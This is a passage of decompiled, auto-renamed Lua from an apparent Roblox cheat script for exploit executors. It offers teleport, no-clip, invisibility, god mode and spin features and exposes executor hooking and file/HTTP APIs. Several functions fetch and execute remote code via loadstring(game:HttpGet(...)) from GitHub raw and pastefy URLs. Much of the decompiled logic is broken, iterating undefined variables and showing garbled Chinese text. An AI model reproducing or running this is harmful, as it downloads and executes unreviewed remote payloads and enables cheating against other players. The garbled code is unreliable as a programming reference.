    game.Players:GetPlayers()
    local Element27
    local Element28 = ipairs(Element27)
    local Pack3 = table.pack(Element28(Element27, 0))
    local Unpacked3 = table.unpack(Pack3, 1, Pack3.Element21)
    local Element29 = {}
    local Element30
    if not (Unpacked3 == nil) then
        Element30 = Unpacked3
        while true do
            table.insert(Element29, Pack3[2].Name)
            Pack3 = table.pack(Element28(Element27, Element30))
            Unpacked3 = table.unpack(Pack3, 1, Pack3.Element21)
            if Unpacked3 ~= nil then
                Element30 = Unpacked3
                continue
            end
            break
        end
    end
    return Element29
end

local function Job15(teleportTargetName)
    x6.TeleportTargetName = teleportTargetName
    return teleportTargetName, x6
end

local SpeedTab, SpeedTab2
local function Job16()
    SpeedTab2:Refresh(SpeedTab())
end

local Element31
local function Job17()
    local TeleportTargetName = x6.TeleportTargetName
    local findFirstChild, LocalPlayer5, Character7, HumanoidRootPart2, HumanoidRootPart3
    if not TeleportTargetName then
        Element31:Notify({
        Title = "éè¯¯",
        Content = "è¯·åéæ©ç®æ ç©å®¶",
        Icon = "user",
        Duration = 3,
        })
        return TeleportTargetName
    else
        findFirstChild = game.Players:FindFirstChild(TeleportTargetName)
        if not findFirstChild or not findFirstChild.Character then
            Element31:Notify({
            Title = "éè¯¯",
            Content = "ç®æ ç©å®¶ä¸å­å¨ææªå è½½",
            Icon = "user",
            Duration = 3,
            })
            return TeleportTargetName, findFirstChild
        else
            LocalPlayer5 = game.Players.LocalPlayer
            Character7 = LocalPlayer5.Character
            if not Character7 then
                Element31:Notify({
                Title = "éè¯¯",
                Content = "è§è²æªå è½½",
                Icon = "user",
                Duration = 3,
                })
                return TeleportTargetName, findFirstChild, LocalPlayer5, Character7
            else
                HumanoidRootPart2 = Character7:FindFirstChild("HumanoidRootPart")
                HumanoidRootPart3 = findFirstChild.Character:FindFirstChild("HumanoidRootPart")
                if HumanoidRootPart2 and HumanoidRootPart3 then
                    HumanoidRootPart2.CFrame = HumanoidRootPart3.CFrame
                    Element31:Notify({
                    Title = "ä¼ éæå",
                    Content = "å·²ä¼ éå° " .. TeleportTargetName,
                    Icon = "check",
                    Duration = 3,
                    })
                    return TeleportTargetName, findFirstChild, LocalPlayer5, Character7, HumanoidRootPart2, HumanoidRootPart3
                else
                    return
                end
            end
        end
    end
end

local function Job18()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Vesthardov/KeylessForLoveKFL/refs/heads/main/KFL.txt"))
end

local function Job19(teleportForward)
    x6.TeleportForward = teleportForward
    return teleportForward, x6
end

local function Job20(teleportSide)
    x6.TeleportSide = teleportSide
    return teleportSide, x6
end

local function Job21(teleportHeight)
    x6.TeleportHeight = teleportHeight
    return teleportHeight, x6
end

local function Job22(Content)
    local function Job23()
        local Players = game:GetService("Players")
        local LocalPlayer6 = Players.LocalPlayer
        local Pack4 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Pack4._G = Pack4
        local Unpacked4 = Pack4
        local NoCollision = Pack4.NoCollision
        local Element32, Unpacked5, Element33, Element34, Element35, Unpacked6
        if NoCollision then
            NoCollision = task.wait
            Unpacked4 = 0.3
            NoCollision(0.3)
            while true do
                Players:GetPlayers()
                NoCollision = ipairs(Unpacked4)
                Pack4 = table.pack(NoCollision(Unpacked4, 0))
                Unpacked5 = table.unpack(Pack4, 1, Pack4.Unpacked5)
                repeat
                    local shouldExit = false
                    if not (Unpacked5 == nil) then
                        Element32 = Unpacked5
                        while true do
                            if table.unpack(Pack4, 2, Pack4.Unpacked5).Character then
                                table.unpack(Pack4, 2, Pack4.Unpacked5).Character:GetDescendants()
                                Element33 = ipairs(Element34)
                                Pack4 = table.pack(Element33(Element34, 0))
                                Unpacked6 = table.unpack(Pack4, 1, Pack4.Unpacked5)
                                if not (Unpacked6 == nil) then
                                    Element35 = Unpacked6
                                    while true do
                                        if table.unpack(Pack4, 2, Pack4.Unpacked5)
                                            :IsA("BasePart") then
                                            table.unpack(Pack4, 2, Pack4.Unpacked5).CanCollide = false
                                        end
                                        Pack4 = table.pack(Element33(Element34, Element35))
                                        Unpacked6 = table.unpack(Pack4, 1, Pack4.Unpacked5)
                                        if Unpacked6 ~= nil then
                                            Element35 = Unpacked6
                                            continue
                                        end
                                        break
                                    end
                                end
                                Pack4 = table.pack(NoCollision(Unpacked4, Element32))
                                Unpacked5 = table.unpack(Pack4, 1, Pack4.Unpacked5)
                                if Unpacked5 == nil then
                                    Element32 = Unpacked5
                                else
                                    Element32 = Unpacked5
                                    continue
                                end
                            else
                                Pack4 = table.pack(NoCollision(Unpacked4, Element32))
                                Unpacked5 = table.unpack(Pack4, 1, Pack4.Unpacked5)
                                if Unpacked5 == nil then
                                    break
                                else
                                    Element32 = Unpacked5
                                    continue
                                end
                            end
                            shouldExit = true
                            break
                        end
                        if shouldExit then
                            break
                        end
                    end
                    Element32 = Unpacked5
                until true
                Unpacked4 = getgenv(Element32, table.unpack(Pack4, 1, Pack4.Unpacked5))
                NoCollision = Unpacked4.NoCollision
                if NoCollision then
                    NoCollision = task.wait
                    Unpacked4 = 0.3
                    NoCollision(0.3)
                    continue
                end
                break
            end
            return Players, LocalPlayer6, NoCollision, Unpacked4, Element32, table.unpack(Pack4, 1, Pack4.Unpacked5)
        else
            return Players, LocalPlayer6, NoCollision, Unpacked4
        end
    end
    x6.NoCollision = Content
    local Players, Element36, Element37, Element38, Unpacked7, Element39, Element40, Element41, Unpacked8, Pack5
    if Content then
        task.spawn(Job23)
        return Content
    else
        Players = game:GetService("Players")
        Players:GetPlayers()
        Element36 = ipairs(Element37)
        Pack5 = table.pack(Element36(Element37, 0))
        Unpacked7 = table.unpack(Pack5, 1, Pack5.Unpacked5)
        if not (Unpacked7 == nil) then
            Element38 = Unpacked7
            while true do
                if Pack5[2].Character then
                    Pack5[2].Character:GetDescendants()
                    Element39 = ipairs(Element40)
                    Pack5 = table.pack(Element39(Element40, 0))
                    Unpacked8 = table.unpack(Pack5, 1, Pack5.Unpacked5)
                    if not (Unpacked8 == nil) then
                        Element41 = Unpacked8
                        while true do
                            if table.unpack(Pack5, 2, Pack5.Unpacked5):IsA("BasePart") then
                                table.unpack(Pack5, 2, Pack5.Unpacked5).CanCollide = true
                            end
                            Pack5 = table.pack(Element39(Element40, Element41))
                            Unpacked8 = table.unpack(Pack5, 1, Pack5.Unpacked5)
                            if Unpacked8 ~= nil then
                                Element41 = Unpacked8
                                continue
                            end
                            break
                        end
                    end
                    Pack5 = table.pack(Element36(Element37, Element38))
                    Unpacked7 = table.unpack(Pack5, 1, Pack5.Unpacked5)
                    if Unpacked7 == nil then
                        Element38 = Unpacked7
                    else
                        Element38 = Unpacked7
                        continue
                    end
                else
                    Pack5 = table.pack(Element36(Element37, Element38))
                    Unpacked7 = table.unpack(Pack5, 1, Pack5.Unpacked5)
                    if Unpacked7 == nil then
                        break
                    else
                        Element38 = Unpacked7
                        continue
                    end
                end
                return Content, Players, Element36, Element37, Element38, table.unpack(Pack5, 1, Pack5.Unpacked5)
            end
        end
        return Content, Players, Element36, Element37, Unpacked7, table.unpack(Pack5, 1, Pack5.Unpacked5)
    end
end

local function Job24(invisible)
    local Players, Runservice2, Humanoid8, HumanoidRootPart4, Element42
    local function processItems4()
        local Character8 = Players.Character or Players.CharacterAdded:Wait()
        Runservice2 = Character8
        Humanoid8 = Character8:WaitForChild("Humanoid")
        HumanoidRootPart4 = Runservice2:WaitForChild("HumanoidRootPart")
        Element42 = {}
        local Descendants = Runservice2:GetDescendants()
        Character8 = next
        local Pack6 = table.pack(next(Descendants, nil))
        local Element43 = next(Descendants)
        local Element44
        if not (Element43 == nil) then
            Element44 = Element43
            while true do
                if Descendants:IsA("BasePart") and Pack6[2].Transparency == 0 then
                    table.insert(Element42, table.unpack(Pack6, 2, Pack6.Unpacked5))
                    Element43 = next(Descendants)
                    if Element43 == nil then
                        Element44 = Element43
                    else
                        Element44 = Element43
                        continue
                    end
                else
                    Pack6 = table.pack(next(Descendants, Element44))
                    Element43 = next(Descendants)
                    if Element43 == nil then
                        break
                    else
                        Element44 = Element43
                        continue
                    end
                end
                return Character8, Descendants, Element44, table.unpack(Pack6, 1, Pack6.Unpacked5)
            end
        end
        return next, Descendants, Element43, next(Descendants)
    end
    local Element45
    local function processItems5(Args)
        Element45 = Args
        local Element46 = next(Element42)
        local Element47
        if not (Element46 == nil) then
            while true do
                Element46 = next(Element47)
                if Element46 == nil then
                    break
                end
            end
        end
        return Args, next, Element42, Element46, nil
    end
    local Element48
    local function CharacterAdded()
        Element45 = false
        Element48()
    end
    local RunService
    local function Job25()
        local CFrame2, CameraOffset, Element49, position, Position
        if Element45 and HumanoidRootPart4 and Humanoid8 then
            CFrame2 = HumanoidRootPart4.CFrame
            CameraOffset = Humanoid8.CameraOffset
            Element49 = CFrame2 * CFrame.new(0,-75, 0)
            Position = CFrame2.Position
            position = Element49:ToObjectSpace(CFrame.new(Position)).Position
            HumanoidRootPart4.CFrame = Element49
            Humanoid8.CameraOffset = position
            RunService.RenderStepped:Wait()
            HumanoidRootPart4.CFrame = CFrame2
            Humanoid8.CameraOffset = CameraOffset
            return CFrame2, CameraOffset, Element49, position
        else
            return
        end
    end
    x6.Invisible = invisible
    Players = "Players"
    RunService = game
    local Players = game:GetService("Players")
    Runservice2 = "RunService"
    Players = game
    RunService = game:GetService("RunService")
    Players = Players.LocalPlayer
    Runservice2 = nil
    Humanoid8 = nil
    HumanoidRootPart4 = nil
    Element42 = {}
    Element45 = false
    Element48 = processItems4
    processItems4()
    Players.CharacterAdded:Connect(CharacterAdded)
    RunService.Heartbeat:Connect(Job25)
    processItems5(invisible)
    return invisible, Players, RunService, Players, nil, nil, nil, Element42, false, Element48, processItems5
end

local function Job26()
    loadstring(game:HttpGet("https://pastefy.app/h3VuG7iL/raw"))
end

local function Job27(Request)
    local LocalPlayer7
    local function Job28(...)
        local Element50 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element50._G = Element50
        local Humanoid9 = Element50
        local KorbloxEnabled = Element50.KorbloxEnabled
        local RightFoot, R15, RightUpperLeg
        if KorbloxEnabled then
            task.wait(0.5)
            Humanoid9 = LocalPlayer7
            while true do
                KorbloxEnabled = Humanoid9.Character
                if KorbloxEnabled then
                    Humanoid9 = KorbloxEnabled:FindFirstChildOfClass("Humanoid")
                    if Humanoid9 then
                        R15 = Enum.HumanoidRigType.R15
                        if Humanoid9.RigType == R15 then
                            RightFoot = KorbloxEnabled:FindFirstChild("RightFoot")
                            R15 = KorbloxEnabled:FindFirstChild("RightLowerLeg")
                            RightUpperLeg = KorbloxEnabled:FindFirstChild("RightUpperLeg")
                            if RightUpperLeg and R15 and RightFoot then
                                RightFoot.Transparency = 1
                                R15.Transparency = 1
                                RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
                                RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
                            end
                        else
                            RightFoot = KorbloxEnabled:FindFirstChild("Right Leg")
                            if RightFoot then
                                R15 = RightFoot:FindFirstChildOfClass("SpecialMesh")
                                if not R15 then
                                    R15 = Instance.new("SpecialMesh")
                                    R15.Parent = RightFoot
                                end
                                RightFoot.Color = Color3.fromRGB(64, 64, 64)
                                RightFoot.Transparency = 0
                                R15.MeshType = Enum.MeshType.FileMesh
                                R15.MeshId = "rbxassetid://101851696"
                                R15.TextureId = "rbxassetid://101851254"
                                R15.Scale = Vector3.new(1, 1, 1)
                            end
                        end
                    end
                end
                if getgenv(select(3, ...)).KorbloxEnabled then
                    task.wait(0.5)
                    Humanoid9 = LocalPlayer7
                    continue
                end
                break
            end
            return
        else
            return KorbloxEnabled, Humanoid9
        end
    end
    LocalPlayer7 = x6
    x6.KorbloxEnabled = Request
    if Request then
        LocalPlayer7 = game.Players.LocalPlayer
        task.spawn(Job28)
    end
    return Request, LocalPlayer7
end

local function Job29(headlessEnabled)
    x6.HeadlessEnabled = headlessEnabled
    local LocalPlayer8, Character9, Head, Element51, Element52, Element53, Unpacked9, Pack7
    if headlessEnabled then
        LocalPlayer8 = game.Players.LocalPlayer
        Character9 = LocalPlayer8.Character
        if Character9 then
            Head = Character9:FindFirstChild("Head")
            if Head then
                Head.Transparency = 1
                Head:GetChildren()
                Element51 = ipairs(Element52)
                Pack7 = table.pack(Element51(Element52, 0))
                Unpacked9 = table.unpack(Pack7, 1, Pack7.Unpacked5)
                if not (Unpacked9 == nil) then
                    Element53 = Unpacked9
                    while true do
                        if Pack7[2]:IsA("Decal") or Pack7[2]:IsA("Texture") then
                            Pack7[2].Transparency = 1
                        end
                        Pack7 = table.pack(Element51(Element52, Element53))
                        Unpacked9 = table.unpack(Pack7, 1, Pack7.Unpacked5)
                        if Unpacked9 ~= nil then
                            Element53 = Unpacked9
                            continue
                        end
                        break
                    end
                end
                return headlessEnabled, LocalPlayer8, Character9, Head, Element51, Element52, Unpacked9, table.unpack(Pack7, 1, Pack7.Unpacked5)
            end
            return
        end
    else
        LocalPlayer8 = game.Players.LocalPlayer
        Character9 = LocalPlayer8.Character
        if Character9 then
            Head = Character9:FindFirstChild("Head")
            if Head then
                Head.Transparency = 0
                Head:GetChildren()
                Element51 = ipairs(Element52)
                Pack7 = table.pack(Element51(Element52, 0))
                Unpacked9 = table.unpack(Pack7, 1, Pack7.Unpacked5)
                if not (Unpacked9 == nil) then
                    Element53 = Unpacked9
                    while true do
                        if table.unpack(Pack7, 2, Pack7.Unpacked5)
                            :IsA("Decal") or table.unpack(Pack7, 2, Pack7.Unpacked5)
                            :IsA("Texture") then
                            table.unpack(Pack7, 2, Pack7.Unpacked5).Transparency = 0
                        end
                        Pack7 = table.pack(Element51(Element52, Element53))
                        Unpacked9 = table.unpack(Pack7, 1, Pack7.Unpacked5)
                        if Unpacked9 ~= nil then
                            Element53 = Unpacked9
                            continue
                        end
                        break
                    end
                end
                return headlessEnabled, LocalPlayer8, Character9, Head, Element51, Element52, Unpacked9, table.unpack(Pack7, 1, Pack7.Unpacked5)
            end
            return
        end
    end
end

local function Job30(Request2)
    if Request2 then
        game:GetService("Lighting").Brightness = 2
        game:GetService("Lighting").ClockTime = 14
        game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(255, 255, 255)
    else
        game:GetService("Lighting").Brightness = 1
        game:GetService("Lighting").ClockTime = 14
        game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
    end
end

local function Job31(Request3)
    local function Job32(...)
        local LocalPlayer9 = game.Players.LocalPlayer
        local Element54 = {
        print = print,
        type = type,
        tostring = tostring,
        tonumber = tonumber,
        next = next,
        pairs = pairs,
        ipairs = ipairs,
        select = select,
        rawget = rawget,
        rawset = rawset,
        rawequal = rawequal,
        rawlen = rawlen,
        setmetatable = setmetatable,
        getmetatable = getmetatable,
        assert = assert,
        error = error,
        pcall = pcall,
        xpcall = xpcall,
        unpack = unpack,
        getfenv = getfenv,
        setfenv = setfenv,
        collectgarbage = collectgarbage,
        gcinfo = gcinfo,
        newproxy = newproxy,
        require = require,
        load = load,
        loadstring = load,
        _VERSION = "Lua 5.1",
        string = string,
        table = table,
        math = math,
        bit32 = bit32,
        bit = bit32,
        os = os,
        io = io,
        utf8 = utf8,
        debug = debug,
        coroutine = coroutine,
        buffer = buffer,
        game = game,
        Game = game,
        workspace = workspace,
        Workspace = workspace,
        script = script,
        shared = shared,
        plugin = plugin,
        Instance = Instance,
        Vector2 = Vector2,
        Vector3 = Vector3,
        Vector2int16 = Vector2int16,
        Vector3int16 = Vector3int16,
        CFrame = CFrame,
        Color3 = Color3,
        UDim = UDim,
        UDim2 = UDim2,
        Rect = Rect,
        Region3 = Region3,
        Ray = Ray,
        NumberRange = NumberRange,
        NumberSequence = NumberSequence,
        NumberSequenceKeypoint = NumberSequenceKeypoint,
        ColorSequence = ColorSequence,
        ColorSequenceKeypoint = ColorSequenceKeypoint,
        BrickColor = BrickColor,
        TweenInfo = TweenInfo,
        PhysicalProperties = PhysicalProperties,
        Faces = Faces,
        Axes = Axes,
        Random = Random,
        DateTime = DateTime,
        Font = Font,
        OverlapParams = OverlapParams,
        RaycastParams = RaycastParams,
        Enum = Enum,
        wait = wait,
        tick = tick,
        time = time,
        elapsedTime = elapsedTime,
        typeof = typeof,
        warn = warn,
        spawn = spawn,
        delay = delay,
        task = task,
        getgenv = getgenv,
        getrenv = getrenv,
        getsenv = getsenv,
        getreg = getreg,
        getgc = getgc,
        getloadedmodules = getloadedmodules,
        getinstances = getinstances,
        getnilinstances = getnilinstances,
        getscripts = getscripts,
        getconnections = getconnections,
        getrunningscripts = getrunningscripts,
        getcallingscript = getcallingscript,
        gethui = gethui,
        getthreadidentity = getthreadidentity,
        setthreadidentity = setthreadidentity,
        checkcaller = checkcaller,
        islclosure = islclosure,
        iscclosure = iscclosure,
        isourclosure = isourclosure,
        is_synapse_function = is_synapse_function,
        clonefunction = clonefunction,
        cloneref = cloneref,
        compareinstances = compareinstances,
        newcclosure = newcclosure,
        hookfunction = hookfunction,
        replaceclosure = replaceclosure,
        hookmetamethod = hookmetamethod,
        getrawmetatable = getrawmetatable,
        setrawmetatable = setrawmetatable,
        setreadonly = setreadonly,
        isreadonly = isreadonly,
        make_writeable = make_writeable,
        make_readonly = make_readonly,
        identifyexecutor = identifyexecutor,
        getexecutorname = getexecutorname,
        setclipboard = setclipboard,
        toclipboard = toclipboard,
        setfpscap = setfpscap,
        firetouchinterest = firetouchinterest,
        fireclickdetector = fireclickdetector,
        fireproximityprompt = fireproximityprompt,
        keypress = keypress,
        keyrelease = keyrelease,
        mouse1click = mouse1click,
        mouse1press = mouse1press,
        mouse1release = mouse1release,
        mousemoverel = mousemoverel,
        queue_on_teleport = queue_on_teleport,
        saveinstance = saveinstance,
        decompile = decompile,
        getscriptclosure = getscriptclosure,
        getfunctionhash = getfunctionhash,
        getcustomasset = getcustomasset,
        rconsoleprint = rconsoleprint,
        rconsolename = rconsolename,
        rconsoleclear = rconsoleclear,
        setfflag = setfflag,
        protectgui = protectgui,
        unprotectgui = unprotectgui,
        sethiddenproperty = sethiddenproperty,
        gethiddenproperty = gethiddenproperty,
        isnetworkowner = isnetworkowner,
        isfile = isfile,
        isfolder = isfolder,
        makefolder = makefolder,
        delfile = delfile,
        delfolder = delfolder,
        listfiles = listfiles,
        readfile = readfile,
        writefile = writefile,
        appendfile = appendfile,
        loadfile = loadfile,
        dofile = dofile,
        request = request,
        http_request = request,
        crypt = crypt,
        base64_encode = base64_encode,
        base64_decode = base64_decode,
        base64encode = base64_encode,
        base64decode = base64_decode,
        syn = syn,
        WebSocket = WebSocket,
        Drawing = Drawing,
        DrawingImmediate = Drawing,
        }
        Element54._G = Element54
        local Humanoid10 = Element54
        local GodMode = Element54.GodMode
        if GodMode then
            task.wait()
            Humanoid10 = LocalPlayer9.Character:FindFirstChild("Humanoid")
            if Humanoid10 then
                Humanoid10.Health = Humanoid10.MaxHealth
            end
            GodMode = getgenv(select(3, ...)).GodMode
            task.wait(select(2, ...))
            while true do
                GodMode = LocalPlayer9.Character
                if GodMode then
                    Humanoid10 = GodMode:FindFirstChild("Humanoid")
                    if Humanoid10 then
                        Humanoid10.Health = Humanoid10.MaxHealth
                    end
                end
                if getgenv(select(3, ...)).GodMode then
                    task.wait(select(2, ...))
                    continue
                end
                break
            end
            return LocalPlayer9
        else
            return LocalPlayer9, GodMode, Humanoid10
        end
    end
    local Element55 = x6
    x6.GodMode = Request3
    if Request3 then
        task.spawn(Job32)
        return Request3
    else
        return Request3, Element55
    end
end

local function Job33()
    loadstring(game:HttpGet("https://pastefy.app/vFFg6sYB/raw"))
end

local function Job34(Request4)
    local LocalPlayer10 = game.Players.LocalPlayer
    local Humanoid11 = (LocalPlayer10.Character or LocalPlayer10.CharacterAdded:Wait())
        :WaitForChild("Humanoid")
    Humanoid11.MaxHealth = Request4
    Humanoid11.Health = Request4
end

local function Job35(health)
    local LocalPlayer11 = game.Players.LocalPlayer

    (LocalPlayer11.Character or LocalPlayer11.CharacterAdded:Wait())
        :WaitForChild("Humanoid").Health = health
end

local function Job36(Request5)
    local function Job37(...)
        local LocalPlayer12 = game.Players.LocalPlayer
        local HumanoidRootPart5 = x8
        local SpinEnabled = x8.SpinEnabled
        local Element56
        if SpinEnabled then
            task.wait()
            HumanoidRootPart5 = LocalPlayer12.Character:FindFirstChild("HumanoidRootPart")
            if HumanoidRootPart5 then
                Element56 = getgenv(select(5, ...)).SpinSpeed or 10
                HumanoidRootPart5.CFrame = HumanoidRootPart5.CFrame * CFrame.Angles(0, math.rad(Element56), 0)
            end
            SpinEnabled = getgenv(select(3, ...)).SpinEnabled
            task.wait(select(2, ...))
            while true do
                SpinEnabled = LocalPlayer12.Character
                if SpinEnabled then
                    HumanoidRootPart5 = SpinEnabled:FindFirstChild("HumanoidRootPart")
                    if HumanoidRootPart5 then
                        Element56 = getgenv(select(5, ...)).SpinSpeed or 10
                        HumanoidRootPart5.CFrame = HumanoidRootPart5.CFrame * CFrame.Angles(0, math.rad(Element56), 0)
                    end
                end
                if getgenv(select(3, ...)).SpinEnabled then
                    task.wait(select(2, ...))
                    continue
                end
                break
            end
            return LocalPlayer12
        else
            return LocalPlayer12, SpinEnabled, HumanoidRootPart5
        end
    end
    local Element57 = x6
    x6.SpinEnabled = Request5
    if Request5 then
        task.spawn(Job37)
        return Request5
    else
        return Request5, Element57
    end
end

local function Job38(Request6)
    local Element58 = x6
    Element58.SpinSpeed = tonumber(Request6) or 10
    return Request6, Element58
end

local function Job39()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/TypingSP/verity/main/RQE"))
end

local function Job40()
